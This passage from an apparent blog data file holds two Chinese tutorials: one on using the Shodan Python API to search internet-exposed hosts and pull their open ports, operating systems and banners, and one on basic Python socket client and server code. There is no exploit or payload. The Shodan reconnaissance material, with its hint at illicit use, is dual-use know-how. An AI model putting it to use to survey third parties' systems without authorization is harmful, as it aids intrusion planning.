class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">        IP: %s</div><div class=\"line\">        Organization: %s</div><div class=\"line\">        Operating System: %s</div><div class=\"line\">\"<span class=\"string\">\"\"</span> % (host[<span class=\"string\">'ip_str'</span>], host.get(<span class=\"string\">'org'</span>, <span class=\"string\">'n/a'</span>), host.get(<span class=\"string\">'os'</span>, <span class=\"string\">'n/a'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Print all banners</span></div><div class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> host[<span class=\"string\">'data'</span>]:</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">                Port: %s</div><div class=\"line\">                Banner: %s</div><div class=\"line\"></div><div class=\"line\">        \"<span class=\"string\">\"\"</span> % (item[<span class=\"string\">'port'</span>], item[<span class=\"string\">'data'</span>])</div></pre></td></tr></table></figure></p>\n<p>下面我罗列了几种(/shodan/host/{ip})   host.get()内部的方法属性<br>{<br>region_code,ip,area_code,country_name,postal_code,dma_code,country_code,data,os,product,timestamp,asn,banner…<br>}</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>首先利用python脚本来调用shodan的API还是非常方便的；在笔者看来，最麻烦的无非是确定API接口的各种属性方法。<br>例如：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">msg = api.host(<span class=\"string\">'xxx.xxx.xxx.xxx'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">        msg1: %s</div><div class=\"line\">        msg2: %s</div><div class=\"line\">        msg3: %s</div><div class=\"line\">        msg4: %s</div><div class=\"line\">        msg5: %s</div><div class=\"line\">\"<span class=\"string\">\"\"</span> % (host.get(<span class=\"string\">'region_code'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'area_code'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'asn'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'product'</span>, <span class=\"string\">'n/a'</span>),)</div></pre></td></tr></table></figure></p>\n<p>总之，利用这些属性可以查看各种有用的信息，你懂得！！！</p>\n<p>sign:B-man</p>\n","site":{"data":{}},"excerpt":"","more":"<p>百度一下shodan：black-google，这足以表达出shodan的强大，于是乎就想研究一下shodan的搜索功能。没想到python已经有这个模块了<a href=\"https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。\" target=\"_blank\" rel=\"external\">https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。</a></p>\n<h3 id=\"第一步：安装\"><a href=\"#第一步：安装\" class=\"headerlink\" title=\"第一步：安装\"></a>第一步：安装</h3><p>在开始在python使用shodan库之前呢，首先确保你已经注册shodan并且拿到了API key。然后才能安装并使用(这里使用pip安装)：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&gt;&gt;&gt;python</div><div class=\"line\">&gt;&gt;&gt;pip install shodan</div></pre></td></tr></table></figure></p>\n<h3 id=\"连接API\"><a href=\"#连接API\" class=\"headerlink\" title=\"连接API\"></a>连接API</h3><p>在调用接口前必须先使用shodan的API连接<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">import shodan</div><div class=\"line\">SHODAN_API_KEY = <span class=\"string\">\"insert your API key here\"</span></div><div class=\"line\"></div><div class=\"line\">api = shodan.Shodan(SHODAN_API_KEY)</div></pre></td></tr></table></figure></p>\n<h3 id=\"shodan搜索\"><a href=\"#shodan搜索\" class=\"headerlink\" title=\"shodan搜索\"></a>shodan搜索</h3><p>现在我们已经完成前期配置，可以使用shodan提供的API进行初步搜索：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#利用try/ except 模块抓取错误，直接跳过，不影响运行</span></div><div class=\"line\">try:</div><div class=\"line\">    <span class=\"comment\">#serach shodan</span></div><div class=\"line\">    results = api.search(<span class=\"string\">'Apache'</span>)        <span class=\"comment\"># 输入搜索信息</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">#打印搜索结果</span></div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">'Results found: %s'</span> % results[<span class=\"string\">'total'</span>]</div><div class=\"line\">    <span class=\"keyword\">for</span> result <span class=\"keyword\">in</span> results[<span class=\"string\">'matches'</span>]:</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'IP: %s'</span> % result[<span class=\"string\">'ip_str'</span>]</div><div class=\"line\">        <span class=\"built_in\">print</span> result[<span class=\"string\">'data'</span>]</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">''</span></div><div class=\"line\">except shodan.APIError, e:</div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">'Error: %s'</span> % e</div></pre></td></tr></table></figure></p>\n<p>通过代码，首先我们利用api对象的一个Shodan.search()方法给我们返回一个包含结果的字典信息；这里普通的shodan用户只能返回前100个结果。</p>\n<p>同时，利用该对象函数还能返回更多的信息，下面是Shodan.search()返回的部分结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">        <span class=\"string\">'total'</span>: 8669969,</div><div class=\"line\">        <span class=\"string\">'matches'</span>: [</div><div class=\"line\">                &#123;</div><div class=\"line\">                        <span class=\"string\">'data'</span>: <span class=\"string\">'HTTP/1.0 200 OK\\r\\nDate: Mon, 08 Nov 2010 05:09:59 GMT\\r\\nSer...'</span>,</div><div class=\"line\">                        <span class=\"string\">'hostnames'</span>: [<span class=\"string\">'pl4t1n.de'</span>],</div><div class=\"line\">                        <span class=\"string\">'ip'</span>: 3579573318,</div><div class=\"line\">                        <span class=\"string\">'ip_str'</span>: <span class=\"string\">'89.110.147.239'</span>,</div><div class=\"line\">                        <span class=\"string\">'os'</span>: <span class=\"string\">'FreeBSD 4.4'</span>,</div><div class=\"line\">                        <span class=\"string\">'port'</span>: 80,</div><div class=\"line\">                        <span class=\"string\">'timestamp'</span>: <span class=\"string\">'2014-01-15T05:49:56.283713'</span></div><div class=\"line\">                &#125;,</div><div class=\"line\">                ...</div><div class=\"line\">        ]</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>返回更多属性方法列表：<a href=\"https://developer.shodan.io/api\" target=\"_blank\" rel=\"external\">REST API documentation</a></p>\n<h3 id=\"host查询\"><a href=\"#host查询\" class=\"headerlink\" title=\"host查询\"></a>host查询</h3><p>我们可以用shodan.host()方法来查询ip等内容信息：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># Lookup the host</span></div><div class=\"line\">host = api.host(<span class=\"string\">'217.140.75.46'</span>)        <span class=\"comment\">#输入ip域名</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Print general info</span></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">        IP: %s</div><div class=\"line\">        Organization: %s</div><div class=\"line\">        Operating System: %s</div><div class=\"line\">\"<span class=\"string\">\"\"</span> % (host[<span class=\"string\">'ip_str'</span>], host.get(<span class=\"string\">'org'</span>, <span class=\"string\">'n/a'</span>), host.get(<span class=\"string\">'os'</span>, <span class=\"string\">'n/a'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Print all banners</span></div><div class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> host[<span class=\"string\">'data'</span>]:</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">                Port: %s</div><div class=\"line\">                Banner: %s</div><div class=\"line\"></div><div class=\"line\">        \"<span class=\"string\">\"\"</span> % (item[<span class=\"string\">'port'</span>], item[<span class=\"string\">'data'</span>])</div></pre></td></tr></table></figure></p>\n<p>下面我罗列了几种(/shodan/host/{ip})   host.get()内部的方法属性<br>{<br>region_code,ip,area_code,country_name,postal_code,dma_code,country_code,data,os,product,timestamp,asn,banner…<br>}</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>首先利用python脚本来调用shodan的API还是非常方便的；在笔者看来，最麻烦的无非是确定API接口的各种属性方法。<br>例如：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">msg = api.host(<span class=\"string\">'xxx.xxx.xxx.xxx'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"\"</span><span class=\"string\">\"</span></div><div class=\"line\">        msg1: %s</div><div class=\"line\">        msg2: %s</div><div class=\"line\">        msg3: %s</div><div class=\"line\">        msg4: %s</div><div class=\"line\">        msg5: %s</div><div class=\"line\">\"<span class=\"string\">\"\"</span> % (host.get(<span class=\"string\">'region_code'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'area_code'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'asn'</span>, <span class=\"string\">'n/a'</span>),host.get(<span class=\"string\">'product'</span>, <span class=\"string\">'n/a'</span>),)</div></pre></td></tr></table></figure></p>\n<p>总之，利用这些属性可以查看各种有用的信息，你懂得！！！</p>\n<p>sign:B-man</p>\n"},{"title":"python--socket","date":"2016-10-10T08:29:32.000Z","_content":"通过socket模块构造的服务端和客户端，在两台机器之间构造新的通道，从而进行信息传输。\n\n## 下午茶~~~~\n### 编写server步骤：\n摘录[原文](http://www.cnblogs.com/alan-babyblog/p/5260156.html)\n1. 第一步是创建socket对象。调用socket构造函数。如：\n\nsocket = socket.socket( family, type )\n\nfamily参数代表地址家族，可为AF_INET或AF_UNIX。AF_INET家族包括Internet地址，AF_UNIX家族用于同一台机器上的进程间通信。\n\ntype参数代表套接字类型，可为SOCK_STREAM(流套接字)和SOCK_DGRAM(数据报套接字)。\n\n2. 第二步是将socket绑定到指定地址。这是通过socket对象的bind方法来实现的：\n\nsocket.bind( address )\n\n由AF_INET所创建的套接字，address地址必须是一个双元素元组，格式是(host,port)。host代表主机，port代表端口号。如果端口号正在使用、主机名不正确或端口已被保留，bind方法将引发socket.error异常。\n\n3. 第三步是使用socket套接字的listen方法接收连接请求。\n\nsocket.listen( backlog )\n\nbacklog指定最多允许多少个客户连接到服务器。它的值至少为1。收到连接请求后，这些请求需要排队，如果队列满，就拒绝请求。\n\n4. 第四步是服务器套接字通过socket的accept方法等待客户请求一个连接。\n\nconnection, address = socket.accept()\n\n调 用accept方法时，socket会时入“waiting”状态。客户请求连接时，方法建立连接并返回服务器。accept方法返回一个含有两个元素的 元组(connection,address)。第一个元素connection是新的socket对象，服务器必须通过它与客户通信；第二个元素 address是客户的Internet地址。\n\n5. 第五步是处理阶段，服务器和客户端通过send和recv方法通信(传输 数据)。服务器调用send，并采用字符串形式向客户发送信息。send方法返回已发送的字符个数。服务器使用recv方法从客户接收信息。调用recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。recv方法在接收数据时会进入“blocked”状态，最后返回一个字符 串，用它表示收到的数据。如果发送的数据量超过了recv所允许的，数据会被截短。多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区 删除(以及自上次调用recv以来，客户可能发送的其它任何数据)。\n\n6. 传输结束，服务器调用socket的close方法关闭连接。\n\n### 服务端代码\n``` bash\n#!usr/bin/env python\n#encoding=utf-8\n\nimport socket\n\nHOST = '10.0.3.59'\nPORT = 8888\n\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((HOST, PORT))\ns.listen(5)\n\nprint 'Server start at: %s:%s' %(HOST, PORT)\nprint \"wait for connection...\"\n\nwhile True:\n\tconn, addr = s.accept()\n\tprint 'Connected by ', addr\n\n\twhile True:\n\t\tdata = conn.recv(1024)\n\t\tprint data\n\n\t\tconn.send(\"server received you message.\")\n\n# conn.close()\n```\n\n### python编写client的步骤：\n1. 创建一个socket以连接服务器：socket = socket.socket( family, type )\n\n2.使用socket的connect方法连接服务器。对于AF_INET家族,连接格式如下：\n\nsocket.connect( (host,port) )\n\nhost代表服务器主机名或IP，port代表服务器进程所绑定的端口号。如连接成功，客户就可通过套接字与服务器通信，如果连接失败，会引发socket.error异常。\n\n3. 处理阶段，客户和服务器将通过send方法和recv方法通信。\n\n4. 传输结束，客户通过调用socket的close方法关闭连接。\n\n### 客户端代码\n``` bash\n#!usr/bin/env python\n#coding=utf-8\n\nimport socket\nHOST='10.0.3.59'\nPORT=8888\n\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\n\nwhile True:\n\tcmd=raw_input(\"Please input msg:\")\n\ts.send(cmd)\n\tdata=s.recv(1024)\n\tprint data\n\n#s.close()\n```\n![picture](/upload_image/socket.jpg)\n\nmore info[info1](https://gist.github.com/kevinkindom/108ffd675cb9253f8f71)\nmore info[info2](http://yangrong.blog.51cto.com/6945369/1339593)\n\n### sign:bman","source":"_posts/python-socket.md","raw":"---\ntitle: python--socket\ndate: 2016-10-10 16:29:32\ntags:\n---\n通过socket模块构造的服务端和客户端，在两台机器之间构造新的通道，从而进行信息传输。\n\n## 下午茶~~~~\n### 编写server步骤：\n摘录[原文](http://www.cnblogs.com/alan-babyblog/p/5260156.html)\n1. 第一步是创建socket对象。调用socket构造函数。如：\n\nsocket = socket.socket( family, type )\n\nfamily参数代表地址家族，可为AF_INET或AF_UNIX。AF_INET家族包括Internet地址，AF_UNIX家族用于同一台机器上的进程间通信。\n\ntype参数代表套接字类型，可为SOCK_STREAM(流套接字)和SOCK_DGRAM(数据报套接字)。\n\n2. 第二步是将socket绑定到指定地址。这是通过socket对象的bind方法来实现的：\n\nsocket.bind( address )\n\n由AF_INET所创建的套接字，address地址必须是一个双元素元组，格式是(host,port)。host代表主机，port代表端口号。如果端口号正在使用、主机名不正确或端口已被保留，bind方法将引发socket.error异常。\n\n3. 第三步是使用socket套接字的listen方法接收连接请求。\n\nsocket.listen( backlog )\n\nbacklog指定最多允许多少个客户连接到服务器。它的值至少为1。收到连接请求后，这些请求需要排队，如果队列满，就拒绝请求。\n\n4. 第四步是服务器套接字通过socket的accept方法等待客户请求一个连接。\n\nconnection, address = socket.accept()\n\n调 用accept方法时，socket会时入“waiting”状态。客户请求连接时，方法建立连接并返回服务器。accept方法返回一个含有两个元素的 元组(connection,address)。第一个元素connection是新的socket对象，服务器必须通过它与客户通信；第二个元素 address是客户的Internet地址。\n\n5. 第五步是处理阶段，服务器和客户端通过send和recv方法通信(传输 数据)。服务器调用send，并采用字符串形式向客户发送信息。send方法返回已发送的字符个数。服务器使用recv方法从客户接收信息。调用recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。recv方法在接收数据时会进入“blocked”状态，最后返回一个字符 串，用它表示收到的数据。如果发送的数据量超过了recv所允许的，数据会被截短。多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区 删除(以及自上次调用recv以来，客户可能发送的其它任何数据)。\n\n6. 传输结束，服务器调用socket的close方法关闭连接。\n\n### 服务端代码\n``` bash\n#!usr/bin/env python\n#encoding=utf-8\n\nimport socket\n\nHOST = '10.0.3.59'\nPORT = 8888\n\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((HOST, PORT))\ns.listen(5)\n\nprint 'Server start at: %s:%s' %(HOST, PORT)\nprint \"wait for connection...\"\n\nwhile True:\n\tconn, addr = s.accept()\n\tprint 'Connected by ', addr\n\n\twhile True:\n\t\tdata = conn.recv(1024)\n\t\tprint data\n\n\t\tconn.send(\"server received you message.\")\n\n# conn.close()\n```\n\n### python编写client的步骤：\n1. 创建一个socket以连接服务器：socket = socket.socket( family, type )\n\n2.使用socket的connect方法连接服务器。对于AF_INET家族,连接格式如下：\n\nsocket.connect( (host,port) )\n\nhost代表服务器主机名或IP，port代表服务器进程所绑定的端口号。如连接成功，客户就可通过套接字与服务器通信，如果连接失败，会引发socket.error异常。\n\n3. 处理阶段，客户和服务器将通过send方法和recv方法通信。\n\n4. 传输结束，客户通过调用socket的close方法关闭连接。\n\n### 客户端代码\n``` bash\n#!usr/bin/env python\n#coding=utf-8\n\nimport socket\nHOST='10.0.3.59'\nPORT=8888\n\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\n\nwhile True:\n\tcmd=raw_input(\"Please input msg:\")\n\ts.send(cmd)\n\tdata=s.recv(1024)\n\tprint data\n\n#s.close()\n```\n![picture](/upload_image/socket.jpg)\n\nmore info[info1](https://gist.github.com/kevinkindom/108ffd675cb9253f8f71)\nmore info[info2](http://yangrong.blog.51cto.com/6945369/1339593)\n\n### sign:bman","slug":"python-socket","published":1,"updated":"2017-05-31T07:58:06.618Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g11v0006joo5l1ykswzg","content":"<p>通过socket模块构造的服务端和客户端，在两台机器之间构造新的通道，从而进行信息传输。</p>\n<h2 id=\"下午茶\"><a href=\"#下午茶\" class=\"headerlink\" title=\"下午茶~~~~\"></a>下午茶~~~~</h2><h3 id=\"编写server步骤：\"><a href=\"#编写server步骤：\" class=\"headerlink\" title=\"编写server步骤：\"></a>编写server步骤：</h3><p>摘录<a href=\"http://www.cnblogs.com/alan-babyblog/p/5260156.html\" target=\"_blank\" rel=\"external\">原文</a></p>\n<ol>\n<li>第一步是创建socket对象。调用socket构造函数。如：</li>\n</ol>\n<p>socket = socket.socket( family, type )</p>\n<p>family参数代表地址家族，可为AF_INET或AF_UNIX。AF_INET家族包括Internet地址，AF_UNIX家族用于同一台机器上的进程间通信。</p>\n<p>type参数代表套接字类型，可为SOCK_STREAM(流套接字)和SOCK_DGRAM(数据报套接字)。</p>\n<ol>\n<li>第二步是将socket绑定到指定地址。这是通过socket对象的bind方法来实现的：</li>\n</ol>\n<p>socket.bind( address )</p>\n<p>由AF_INET所创建的套接字，address地址必须是一个双元素元组，格式是(host,port)。host代表主机，port代表端口号。如果端口号正在使用、主机名不正确或端口已被保留，bind方法将引发socket.error异常。</p>\n<ol>\n<li>第三步是使用socket套接字的listen方法接收连接请求。</li>\n</ol>\n<p>socket.listen( backlog )</p>\n<p>backlog指定最多允许多少个客户连接到服务器。它的值至少为1。收到连接请求后，这些请求需要排队，如果队列满，就拒绝请求。</p>\n<ol>\n<li>第四步是服务器套接字通过socket的accept方法等待客户请求一个连接。</li>\n</ol>\n<p>connection, address = socket.accept()</p>\n<p>调 用accept方法时，socket会时入“waiting”状态。客户请求连接时，方法建立连接并返回服务器。accept方法返回一个含有两个元素的 元组(connection,address)。第一个元素connection是新的socket对象，服务器必须通过它与客户通信；第二个元素 address是客户的Internet地址。</p>\n<ol>\n<li><p>第五步是处理阶段，服务器和客户端通过send和recv方法通信(传输 数据)。服务器调用send，并采用字符串形式向客户发送信息。send方法返回已发送的字符个数。服务器使用recv方法从客户接收信息。调用recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。recv方法在接收数据时会进入“blocked”状态，最后返回一个字符 串，用它表示收到的数据。如果发送的数据量超过了recv所允许的，数据会被截短。多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区 删除(以及自上次调用recv以来，客户可能发送的其它任何数据)。</p>\n</li>\n<li><p>传输结束，服务器调用socket的close方法关闭连接。</p>\n</li>\n</ol>\n<h3 id=\"服务端代码\"><a href=\"#服务端代码\" class=\"headerlink\" title=\"服务端代码\"></a>服务端代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#encoding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import socket</div><div class=\"line\"></div><div class=\"line\">HOST = <span class=\"string\">'10.0.3.59'</span></div><div class=\"line\">PORT = 8888</div><div class=\"line\"></div><div class=\"line\">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">s.bind((HOST, PORT))</div><div class=\"line\">s.listen(5)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'Server start at: %s:%s'</span> %(HOST, PORT)</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"wait for connection...\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> True:</div><div class=\"line\">\tconn, addr = s.accept()</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'Connected by '</span>, addr</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">while</span> True:</div><div class=\"line\">\t\tdata = conn.recv(1024)</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> data</div><div class=\"line\"></div><div class=\"line\">\t\tconn.send(<span class=\"string\">\"server received you message.\"</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># conn.close()</span></div></pre></td></tr></table></figure>\n<h3 id=\"python编写client的步骤：\"><a href=\"#python编写client的步骤：\" class=\"headerlink\" title=\"python编写client的步骤：\"></a>python编写client的步骤：</h3><ol>\n<li>创建一个socket以连接服务器：socket = socket.socket( family, type )</li>\n</ol>\n<p>2.使用socket的connect方法连接服务器。对于AF_INET家族,连接格式如下：</p>\n<p>socket.connect( (host,port) )</p>\n<p>host代表服务器主机名或IP，port代表服务器进程所绑定的端口号。如连接成功，客户就可通过套接字与服务器通信，如果连接失败，会引发socket.error异常。</p>\n<ol>\n<li><p>处理阶段，客户和服务器将通过send方法和recv方法通信。</p>\n</li>\n<li><p>传输结束，客户通过调用socket的close方法关闭连接。</p>\n</li>\n</ol>\n<h3 id=\"客户端代码\"><a href=\"#客户端代码\" class=\"headerlink\" title=\"客户端代码\"></a>客户端代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import socket</div><div class=\"line\">HOST=<span class=\"string\">'10.0.3.59'</span></div><div class=\"line\">PORT=8888</div><div class=\"line\"></div><div class=\"line\">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">s.connect((HOST, PORT))</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> True:</div><div class=\"line\">\tcmd=raw_input(<span class=\"string\">\"Please input msg:\"</span>)</div><div class=\"line\">\ts.send(cmd)</div><div class=\"line\">\tdata=s.recv(1024)</div><div class=\"line\">\t<span class=\"built_in\">print</span> data</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#s.close()</span></div></pre></td></tr></table></figure>\n<p><img src=\"/upload_image/socket.jpg\" alt=\"picture\"></p>\n<p>more info<a href=\"https://gist.github.com/kevinkindom/108ffd675cb9253f8f71\" target=\"_blank\" rel=\"external\">info1</a><br>more info<a href=\"http://yangrong.blog.51cto.com/6945369/1339593\" target=\"_blank\" rel=\"external\">info2</a></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>通过socket模块构造的服务端和客户端，在两台机器之间构造新的通道，从而进行信息传输。</p>\n<h2 id=\"下午茶\"><a href=\"#下午茶\" class=\"headerlink\" title=\"下午茶~~~~\"></a>下午茶~~~~</h2><h3 id=\"编写server步骤：\"><a href=\"#编写server步骤：\" class=\"headerlink\" title=\"编写server步骤：\"></a>编写server步骤：</h3><p>摘录<a href=\"http://www.cnblogs.com/alan-babyblog/p/5260156.html\" target=\"_blank\" rel=\"external\">原文</a></p>\n<ol>\n<li>第一步是创建socket对象。调用socket构造函数。如：</li>\n</ol>\n<p>socket = socket.socket( family, type )</p>\n<p>family参数代表地址家族，可为AF_INET或AF_UNIX。AF_INET家族包括Internet地址，AF_UNIX家族用于同一台机器上的进程间通信。</p>\n<p>type参数代表套接字类型，可为SOCK_STREAM(流套接字)和SOCK_DGRAM(数据报套接字)。</p>\n<ol>\n<li>第二步是将socket绑定到指定地址。这是通过socket对象的bind方法来实现的：</li>\n</ol>\n<p>socket.bind( address )</p>\n<p>由AF_INET所创建的套接字，address地址必须是一个双元素元组，格式是(host,port)。host代表主机，port代表端口号。如果端口号正在使用、主机名不正确或端口已被保留，bind方法将引发socket.error异常。</p>\n<ol>\n<li>第三步是使用socket套接字的listen方法接收连接请求。</li>\n</ol>\n<p>socket.listen( backlog )</p>\n<p>backlog指定最多允许多少个客户连接到服务器。它的值至少为1。收到连接请求后，这些请求需要排队，如果队列满，就拒绝请求。</p>\n<ol>\n<li>第四步是服务器套接字通过socket的accept方法等待客户请求一个连接。</li>\n</ol>\n<p>connection, address = socket.accept()</p>\n<p>调 用accept方法时，socket会时入“waiting”状态。客户请求连接时，方法建立连接并返回服务器。accept方法返回一个含有两个元素的 元组(connection,address)。第一个元素connection是新的socket对象，服务器必须通过它与客户通信；第二个元素 address是客户的Internet地址。</p>\n<ol>\n<li><p>第五步是处理阶段，服务器和客户端通过send和recv方法通信(传输 数据)。服务器调用send，并采用字符串形式向客户发送信息。send方法返回已发送的字符个数。服务器使用recv方法从客户接收信息。调用recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。recv方法在接收数据时会进入“blocked”状态，最后返回一个字符 串，用它表示收到的数据。如果发送的数据量超过了recv所允许的，数据会被截短。多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区 删除(以及自上次调用recv以来，客户可能发送的其它任何数据)。</p>\n</li>\n<li><p>传输结束，服务器调用socket的close方法关闭连接。</p>\n</li>\n</ol>\n<h3 id=\"服务端代码\"><a href=\"#服务端代码\" class=\"headerlink\" title=\"服务端代码\"></a>服务端代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div 